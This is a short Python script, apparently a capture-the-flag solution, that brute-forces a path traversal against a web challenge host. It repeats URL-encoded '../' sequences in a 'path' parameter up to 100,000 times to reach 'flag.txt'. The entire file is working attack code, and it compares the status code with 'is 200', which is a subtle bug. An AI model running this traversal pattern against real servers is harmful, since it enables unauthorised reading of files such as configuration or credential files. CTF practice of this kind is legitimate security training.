import urllib3

http = urllib3.PoolManager()

for i in range(100000):
    r = http.request('GET', 'http://web200.ph03nix.club/?path=' + i * '%2E%2E/' + 'flag.txt')
    # print(r.data)
    print(i)
    if r.status is 200:
        print(r.status, end='')
